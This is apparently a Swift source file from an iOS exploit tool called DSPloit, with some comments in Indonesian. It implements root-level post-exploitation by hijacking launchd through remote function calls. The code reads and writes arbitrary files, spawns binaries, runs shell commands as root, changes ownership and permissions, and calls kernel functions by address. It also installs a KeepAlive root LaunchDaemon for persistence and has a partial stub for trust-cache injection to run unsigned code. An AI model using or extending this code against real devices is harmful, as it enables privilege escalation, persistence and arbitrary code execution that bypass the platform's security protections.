//
//  RootExecutor.swift
//  DSPloit
//
//  Root-level operations via launchd RemoteCall
//  All operations: connect → execute → destroy (fast, prevent watchdog)
//  Created by Royan
//

import Foundation
import Combine

/// Root Executor — execute operations as uid=0 via launchd
/// Pattern: connect to launchd → do work → destroy immediately
/// CRITICAL: launchd is PID 1, holding thread >5s = watchdog kill
final class RootExecutor: ObservableObject {
    static let shared = RootExecutor()
    
    @Published var lastResult: RootOpResult?
    @Published var isExecuting = false
    @Published var rootConfirmed = false
    @Published var log: [String] = []
    
    private let mgr = dspmgr.shared
    
    struct RootOpResult: Identifiable {
        let id = UUID()
        let operation: String
        let success: Bool
        let message: String
        let returnValue: UInt64
        let timestamp: Date
    }
    
    private func appendLog(_ msg: String) {
        DispatchQueue.main.async {
            self.log.append(msg)
            if self.log.count > 500 { self.log.removeFirst(200) }
        }
        globallogger.log("(root) \(msg)")
    }
    
    // MARK: - Remote Call Helper
    
    /// Call a C function in the remote process (replaces ObjC RemoteArbCall macro)
    /// Returns the function's return value as UInt64
    @discardableResult
    static func rcall(_ rc: RemoteCall, _ name: String, _ args: UInt64...) -> UInt64 {
        let RTLD_DEFAULT = UnsafeMutableRawPointer(bitPattern: -2)
        let ptr = dlsym(RTLD_DEFAULT, name)
        var argsCopy = args.isEmpty ? [UInt64(0)] : Array(args)
        let argCount = UInt(args.count)
        return name.withCString { cName -> UInt64 in
            UInt64(argsCopy.withUnsafeMutableBufferPointer { buffer in
                rc.doStable(
                    withTimeout: 5,
                    functionName: UnsafeMutablePointer(mutating: cName),
                    functionPointer: ptr,
                    args: buffer.baseAddress,
                    argCount: argCount
                )
            })
        }
    }

    /// Call a kernel function via direct address (Opsi C — bukan dlsym).
    /// Digunakan untuk memanggil fungsi kernel yang tidak di-export ke userspace dylib,
    /// seperti trust_cache_runtime_add yang hanya ada di kernelcache.
    ///
    /// fnAddr: runtime VA dari fungsi kernel (kernel_base + offset dari kernelcache symtab)
    /// args: argumen fungsi (max 8, sesuai ARM64 ABI x0-x7)
    ///
    /// CATATAN: Untuk fungsi shared cache (xpc_*, sandbox_*, dll), GUNAKAN rcall() bukan rcallAddr().
    /// rcall() resolve via dlsym yang benar di remote process.
    /// rcallAddr() hanya untuk fungsi yang TIDAK ada di shared cache.
    @discardableResult
    static func rcallAddr(_ rc: RemoteCall, _ fnAddr: UInt64, _ args: UInt64...) -> UInt64 {
        guard fnAddr != 0 && fnAddr != UInt64(bitPattern: -1) else { return 0xDEAD }
        // Safety: reject obviously invalid addresses
        // Valid userspace: 0x100000000...0x800000000 (shared cache + app)
        // Valid kernel: 0xfffffff000000000+ (kernel VA)
        let isUserspace = fnAddr >= 0x100000000 && fnAddr < 0x800000000
        let isKernel = fnAddr >= 0xfffffff000000000
        guard isUserspace || isKernel else {
            globallogger.log("(rcallAddr) REJECTED invalid addr: 0x\(String(format: "%llx", fnAddr))")
            return 0xDEAD
        }
        let ptr = UnsafeMutableRawPointer(bitPattern: UInt(fnAddr))
        var argsCopy = args.isEmpty ? [UInt64(0)] : Array(args)
        let argCount = UInt(args.count)
        let placeholder = "fn_\(String(format: "%llx", fnAddr))"
        return placeholder.withCString { cName -> UInt64 in
            UInt64(argsCopy.withUnsafeMutableBufferPointer { buffer in
                rc.doStable(
                    withTimeout: 5,
                    functionName: UnsafeMutablePointer(mutating: cName),
                    functionPointer: ptr,
                    args: buffer.baseAddress,
                    argCount: argCount
                )
            })
        }
    }
    
    // MARK: - Core: Execute block as root
    
    /// Execute a series of operations in launchd context (uid=0)
    /// The block receives the RemoteCall instance and must complete quickly (<3s)
    /// After the block returns, launchd thread is released immediately
    /// Auto-reconnects SpringBoard RC if it died
    #if !DISABLE_REMOTECALL
    func executeAsRoot(
        operation: String,
        block: @escaping (RemoteCall) -> (success: Bool, message: String, value: UInt64)
    ) {
        guard mgr.dsready else {
            appendLog("❌ Kernel not ready — run exploit first")
            return
        }
        
        isExecuting = true
        
        // Auto-reconnect SpringBoard RC if it died
        if !mgr.rcready {
            appendLog("[\(operation)] RC dead — reconnecting SpringBoard...")
            mgr.rcinit(process: "SpringBoard", migbypass: false) { [weak self] success in
                guard let self else { return }
                if success {
                    self.appendLog("[\(operation)] ✅ SpringBoard reconnected")
                    self.doExecuteAsRoot(operation: operation, block: block)
                } else {
                    self.appendLog("[\(operation)] ❌ SpringBoard reconnect failed")
                    DispatchQueue.main.async {
                        self.lastResult = RootOpResult(operation: operation, success: false, message: "RC reconnect failed", returnValue: 0, timestamp: Date())
                        self.isExecuting = false
                    }
                }
            }
        } else {
            doExecuteAsRoot(operation: operation, block: block)
        }
    }
    
    private func doExecuteAsRoot(
        operation: String,
        block: @escaping (RemoteCall) -> (success: Bool, message: String, value: UInt64)
    ) {
        appendLog("[\(operation)] Connecting to launchd...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            // Connect to launchd
            self.mgr.rcinitDaemon(
                serviceName: "com.apple.launchd",
                framework: nil,
                process: "launchd",
                migbypass: false
            ) { [weak self] launchdRC in
                guard let self else { return }
                
                guard let rc = launchdRC else {
                    let error = RemoteCall.lastInitError() ?? "unknown"
                    self.appendLog("[\(operation)] ❌ launchd connect failed: \(error)")
                    DispatchQueue.main.async {
                        self.lastResult = RootOpResult(operation: operation, success: false, message: error, returnValue: 0, timestamp: Date())
                        self.isExecuting = false
                    }
                    return
                }
                
                // Execute the operation (MUST BE FAST)
                self.appendLog("[\(operation)] Executing as root...")
                let result = block(rc)
                
                // IMMEDIATELY release launchd
                rc.destroy()
                self.appendLog("[\(operation)] launchd released")
                
                DispatchQueue.main.async {
                    self.rootConfirmed = true
                    self.lastResult = RootOpResult(
                        operation: operation,
                        success: result.success,
                        message: result.message,
                        returnValue: result.value,
                        timestamp: Date()
                    )
                    self.appendLog("[\(operation)] \(result.success ? "✅" : "❌") \(result.message)")
                    self.isExecuting = false
                }
            }
        }
    }
    
    // MARK: - Operation 1: Verify Root
    
    func verifyRoot() {
        executeAsRoot(operation: "verify_root") { rc in
            let uid = RootExecutor.rcall(rc, "getuid")
            let pid = RootExecutor.rcall(rc, "getpid")
            let msg = "uid=\(uid), pid=\(pid)"
            return (uid == 0, msg, UInt64(uid))
        }
    }
    
    // MARK: - Operation 2: Write File as Root
    
    func writeFileAsRoot(path: String, content: Data) {
        executeAsRoot(operation: "write_file") { rc in
            let mem = rc.trojanMem
            
            // open(path, O_WRONLY|O_CREAT|O_TRUNC, 0644)
            let pathAddr = remote_alloc_str(rc, path)
            let flags: UInt64 = UInt64(O_WRONLY | O_CREAT | O_TRUNC)
            let mode: UInt64 = 0o644
            let fd = RootExecutor.rcall(rc, "open", pathAddr, flags, mode)
            
            guard fd != UInt64(bitPattern: -1) else {
                let err = remote_errno(rc)
                RootExecutor.rcall(rc, "free", pathAddr)
                return (false, "open failed: errno=\(err)", 0)
            }
            
            // Write content in chunks (trojanMem has limited space)
            let chunkSize = 0x1000 // 4KB chunks
            var written: Int = 0
            let writeAddr = mem + 0x800
            
            content.withUnsafeBytes { buffer in
                while written < content.count {
                    let remaining = content.count - written
                    let toWrite = min(remaining, chunkSize)
                    
                    // Copy chunk to remote memory
                    rc.remote_write(writeAddr, from: buffer.baseAddress!.advanced(by: written), size: UInt64(toWrite))
                    
                    // write(fd, buf, len)
                    let n = RootExecutor.rcall(rc, "write", fd, writeAddr, UInt64(toWrite))
                    if n == 0 || n == UInt64(bitPattern: -1) { break }
                    written += Int(n)
                }
            }
            
            // close(fd)
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            let success = written == content.count
            return (success, success ? "Wrote \(written) bytes to \(path)" : "Partial write: \(written)/\(content.count)", UInt64(written))
        }
    }
    
    // MARK: - Operation 3: posix_spawn as Root
    
    func spawnAsRoot(binary: String, args: [String] = []) {
        executeAsRoot(operation: "posix_spawn") { rc in
            let mem = rc.trojanMem
            
            // Build argv array in remote memory
            let binAddr = remote_alloc_str(rc, binary)
            
            // argv[0] = binary, argv[1..n] = args, argv[n+1] = NULL
            let argvBase = mem + 0x400
            var argvPtrs: [UInt64] = [binAddr]
            
            for (_, arg) in args.prefix(6).enumerated() { // max 6 args
                let argAddr = remote_alloc_str(rc, arg)
                argvPtrs.append(argAddr)
            }
            argvPtrs.append(0) // NULL terminator
            
            // Write argv array to remote memory
            for (i, ptr) in argvPtrs.enumerated() {
                rc[argvBase + UInt64(i * 8)].setValue64(ptr)
            }
            
            // pid_t output
            let pidAddr = mem + 0x300
            rc[pidAddr].setValue32(0)
            
            // posix_spawn(&pid, binary, NULL, NULL, argv, NULL)
            let result = RootExecutor.rcall(rc, "posix_spawn", pidAddr, binAddr, 0, 0, argvBase, 0)
            let spawnedPid = rc[pidAddr].value32()
            
            // Free allocated strings
            RootExecutor.rcall(rc, "free", binAddr)
            for ptr in argvPtrs where ptr != 0 && ptr != binAddr {
                RootExecutor.rcall(rc, "free", ptr)
            }
            
            if result == 0 && spawnedPid != 0 {
                return (true, "Spawned \(binary) as root (PID \(spawnedPid))", UInt64(spawnedPid))
            } else {
                return (false, "posix_spawn failed: ret=\(result), pid=\(spawnedPid)", UInt64(result))
            }
        }
    }
    
    // MARK: - Operation 4: chmod/chown as Root
    
    func chownAsRoot(path: String, uid: UInt32, gid: UInt32) {
        executeAsRoot(operation: "chown") { rc in
            let pathAddr = remote_alloc_str(rc, path)
            let result = RootExecutor.rcall(rc, "chown", pathAddr, UInt64(uid), UInt64(gid))
            RootExecutor.rcall(rc, "free", pathAddr)
            return (result == 0, result == 0 ? "chown \(uid):\(gid) \(path)" : "chown failed: errno=\(remote_errno(rc))", UInt64(result))
        }
    }
    
    func chmodAsRoot(path: String, mode: UInt16) {
        executeAsRoot(operation: "chmod") { rc in
            let pathAddr = remote_alloc_str(rc, path)
            let result = RootExecutor.rcall(rc, "chmod", pathAddr, UInt64(mode))
            RootExecutor.rcall(rc, "free", pathAddr)
            return (result == 0, result == 0 ? "chmod \(String(format: "%o", mode)) \(path)" : "chmod failed: errno=\(remote_errno(rc))", UInt64(result))
        }
    }
    
    func mkdirAsRoot(path: String) {
        executeAsRoot(operation: "mkdir") { rc in
            let pathAddr = remote_alloc_str(rc, path)
            let result = RootExecutor.rcall(rc, "mkdir", pathAddr, 0o755)
            RootExecutor.rcall(rc, "free", pathAddr)
            return (result == 0 || remote_errno(rc) == EEXIST, "mkdir \(path) (ret=\(result))", UInt64(result))
        }
    }
    
    // MARK: - Operation 5: Install LaunchDaemon as Root
    
    func installLaunchDaemonAsRoot(label: String, program: String, keepAlive: Bool = true) {
        let plist = """
        <?xml version="1.0" encoding="UTF-8"?>
        <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
        <plist version="1.0">
        <dict>
            <key>Label</key>
            <string>\(label)</string>
            <key>ProgramArguments</key>
            <array>
                <string>\(program)</string>
            </array>
            <key>RunAtLoad</key>
            <true/>
            <key>KeepAlive</key>
            <\(keepAlive ? "true" : "false")/>
            <key>UserName</key>
            <string>root</string>
        </dict>
        </plist>
        """
        
        let path = "/Library/LaunchDaemons/\(label).plist"
        let data = Data(plist.utf8)
        
        appendLog("[install_daemon] Writing \(path)...")
        writeFileAsRoot(path: path, content: data)
    }
    
    // MARK: - Operation 6: Trust Cache Injection
    
    /// Inject a CDHash into the dynamic trust cache
    /// This allows unsigned binaries to execute
    func injectTrustCache(cdhash: [UInt8]) {
        guard cdhash.count == 20 else {
            appendLog("[trust_cache] CDHash must be 20 bytes")
            return
        }
        
        executeAsRoot(operation: "trust_cache") { rc in
            // On iOS 18, dynamic trust cache is managed by trustd
            // We can call trustd's private API or directly manipulate
            // the kernel trust cache structure
            
            // Method 1: Use MobileContainerManager to add to trust cache
            // This requires the binary to exist on disk first
            
            // Method 2: Direct kernel manipulation (requires KRW to trust cache zone)
            // This is blocked by socket KRW zone limitation
            
            // Method 3: Use launchd to call trustd
            // trustd has com.apple.private.security.storage.TrustCache entitlement
            
            // For now, log the attempt and return info
            let hashHex = cdhash.map { String(format: "%02x", $0) }.joined()
            
            // Try calling amfi_check_trust_cache_for_hash
            // This is a read operation — just verify if hash is already trusted
            let mem = rc.trojanMem
            let hashAddr = mem + 0x900
            
            // Write cdhash to remote memory
            var hashData = cdhash
            rc.remote_write(hashAddr, from: &hashData, size: 20)
            
            return (false, "Trust cache injection requires trustd integration (CDHash: \(hashHex))", 0)
        }
    }
    
    // MARK: - Operation 7: Read File as Root
    
    func readFileAsRoot(path: String, maxSize: Int = 4096, completion: @escaping (Data?) -> Void) {
        executeAsRoot(operation: "read_file") { rc in
            let mem = rc.trojanMem
            let pathAddr = remote_alloc_str(rc, path)
            
            // open(path, O_RDONLY)
            let fd = RootExecutor.rcall(rc, "open", pathAddr, UInt64(O_RDONLY), 0)
            guard fd != UInt64(bitPattern: -1) else {
                RootExecutor.rcall(rc, "free", pathAddr)
                DispatchQueue.main.async { completion(nil) }
                return (false, "open failed: errno=\(remote_errno(rc))", 0)
            }
            
            // read(fd, buf, maxSize)
            let bufAddr = mem + 0x800
            let readSize = min(maxSize, 0x3000) // max 12KB per operation
            let n = RootExecutor.rcall(rc, "read", fd, bufAddr, UInt64(readSize))
            
            var data: Data?
            if n > 0 && n < UInt64(readSize + 1) {
                var buffer = [UInt8](repeating: 0, count: Int(n))
                rc.remoteRead(bufAddr, to: &buffer, size: n)
                data = Data(buffer)
            }
            
            RootExecutor.rcall(rc, "close", fd)
            RootExecutor.rcall(rc, "free", pathAddr)
            
            DispatchQueue.main.async { completion(data) }
            return (n > 0, "Read \(n) bytes from \(path)", n)
        }
    }
    
    // MARK: - Operation 8: Execute Shell Command as Root
    
    func shellAsRoot(command: String) {
        spawnAsRoot(binary: "/bin/sh", args: ["-c", command])
    }
    
    // MARK: - Operation 9: Remount Rootfs (experimental)
    
    func remountRootfs() {
        executeAsRoot(operation: "remount") { rc in
            // On iOS 18 with SSV (Signed System Volume), / is read-only
            // and cryptographically verified. Direct remount won't work.
            // But /var and /private/var are writable.
            
            // Try mount(2) with MNT_UPDATE flag
            let pathAddr = remote_alloc_str(rc, "/private/var")
            
            // Check current mount flags
            let statfsAddr = rc.trojanMem + 0x800
            let result = RootExecutor.rcall(rc, "statfs", pathAddr, statfsAddr)
            
            if result == 0 {
                // Read f_flags from statfs struct (offset 0x28 on arm64)
                let flags = rc[statfsAddr + 0x28].value32()
                let isReadOnly = (flags & UInt32(MNT_RDONLY)) != 0
                
                RootExecutor.rcall(rc, "free", pathAddr)
                return (true, "/private/var flags=0x\(String(format: "%x", flags)) readonly=\(isReadOnly)", UInt64(flags))
            }
            
            RootExecutor.rcall(rc, "free", pathAddr)
            return (false, "statfs failed", 0)
        }
    }
    
    // MARK: - Batch Operations
    
    /// Execute multiple operations in a single launchd connection
    /// More efficient — only one connect/destroy cycle
    func batchExecuteAsRoot(
        operation: String,
        operations: @escaping (RemoteCall) -> [(name: String, success: Bool, message: String)]
    ) {
        guard mgr.dsready, mgr.rcready else {
            appendLog("❌ Need kernel + SpringBoard RC ready")
            return
        }
        
        isExecuting = true
        appendLog("[batch:\(operation)] Connecting to launchd...")
        
        DispatchQueue.global(qos: .userInitiated).async { [weak self] in
            guard let self else { return }
            
            self.mgr.rcinitDaemon(
                serviceName: "com.apple.launchd",
                framework: nil,
                process: "launchd",
                migbypass: false
            ) { [weak self] launchdRC in
                guard let self else { return }
                
                guard let rc = launchdRC else {
                    let error = RemoteCall.lastInitError() ?? "unknown"
                    self.appendLog("[batch:\(operation)] ❌ connect failed: \(error)")
                    DispatchQueue.main.async { self.isExecuting = false }
                    return
                }
                
                // Execute all operations (FAST!)
                let results = operations(rc)
                
                // Release immediately
                rc.destroy()
                
                DispatchQueue.main.async {
                    self.rootConfirmed = true
                    for r in results {
                        self.appendLog("  [\(r.name)] \(r.success ? "✅" : "❌") \(r.message)")
                    }
                    let allSuccess = results.allSatisfy { $0.success }
                    self.lastResult = RootOpResult(
                        operation: operation,
                        success: allSuccess,
                        message: "\(results.filter { $0.success }.count)/\(results.count) operations succeeded",
                        returnValue: UInt64(results.count),
                        timestamp: Date()
                    )
                    self.isExecuting = false
                }
            }
        }
    }
    #endif
}
